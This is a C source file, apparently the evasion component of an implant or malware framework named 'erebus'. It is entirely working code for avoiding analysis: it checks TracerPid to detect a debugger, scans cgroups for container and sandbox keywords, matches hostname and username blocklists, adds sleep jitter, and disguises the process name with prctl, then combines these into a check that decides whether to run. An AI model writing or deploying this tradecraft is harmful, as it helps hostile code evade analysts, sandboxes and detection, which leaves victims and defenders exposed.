#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/prctl.h>
#include "../../include/config.h"
#include "../../include/evasion.h"

/* Read /proc/self/status and return the TracerPid value. */
int erebus_check_ptrace(void)
{
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            long pid = strtol(line + 10, NULL, 10);
            fclose(f);
            return pid != 0;
        }
    }
    fclose(f);
    return 0;
}

/* Scan /proc/self/cgroup for known container / sandbox keywords. */
int erebus_check_cgroup(void)
{
    FILE *f = fopen("/proc/self/cgroup", "r");
    if (!f) return 0;

    static const char *indicators[] = {
        "docker", "lxc", "kubepods", "containerd",
        "sandbox", "crio", "podman", NULL
    };

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        for (int i = 0; indicators[i]; i++) {
            if (strstr(line, indicators[i])) {
                fclose(f);
                return 1;
            }
        }
    }
    fclose(f);
    return 0;
}

/* Case-insensitive hostname substring check. */
int erebus_check_hostname(const char **blocked, int count)
{
    char hostname[256] = {0};
    if (gethostname(hostname, sizeof(hostname) - 1) != 0)
        return 0;

    for (int i = 0; i < (int)strlen(hostname); i++)
        if (hostname[i] >= 'A' && hostname[i] <= 'Z')
            hostname[i] += 32;

    for (int i = 0; i < count; i++) {
        if (strstr(hostname, blocked[i]))
            return 1;
    }
    return 0;
}

/* Case-insensitive username substring check. */
int erebus_check_username(const char **blocked, int count)
{
    const char *user = getenv("USER");
    if (!user) user  = getenv("LOGNAME");
    if (!user) return 0;

    char uname[256] = {0};
    strncpy(uname, user, sizeof(uname) - 1);
    for (int i = 0; i < (int)strlen(uname); i++)
        if (uname[i] >= 'A' && uname[i] <= 'Z')
            uname[i] += 32;

    for (int i = 0; i < count; i++) {
        if (strstr(uname, blocked[i]))
            return 1;
    }
    return 0;
}

void erebus_sleep_jitter(unsigned long base_ms, unsigned long jitter_ms)
{
    unsigned long actual = base_ms;
    if (jitter_ms > 0) {
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        actual += (unsigned long)((unsigned long)ts.tv_nsec % (jitter_ms + 1));
    }
    struct timespec req = {
        .tv_sec  = (time_t)(actual / 1000),
        .tv_nsec = (long)((actual % 1000) * 1000000L)
    };
    nanosleep(&req, NULL);
}

void erebus_masquerade_name(const char *name)
{
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

int erebus_guardrails_check(void)
{
#if CONFIG_CHECK_PTRACE
    if (erebus_check_ptrace()) return 0;
#endif

#if CONFIG_CHECK_CGROUP
    if (erebus_check_cgroup()) return 0;
#endif

#ifdef CONFIG_BLOCKED_HOSTNAMES
    {
        static const char *_blocked_hosts[] = CONFIG_BLOCKED_HOSTNAMES;
        int _count = (int)(sizeof(_blocked_hosts) / sizeof(_blocked_hosts[0]));
        if (erebus_check_hostname(_blocked_hosts, _count)) return 0;
    }
#endif

#ifdef CONFIG_BLOCKED_USERNAMES
    {
        static const char *_blocked_users[] = CONFIG_BLOCKED_USERNAMES;
        int _count = (int)(sizeof(_blocked_users) / sizeof(_blocked_users[0]));
        if (erebus_check_username(_blocked_users, _count)) return 0;
    }
#endif

    return 1;
}
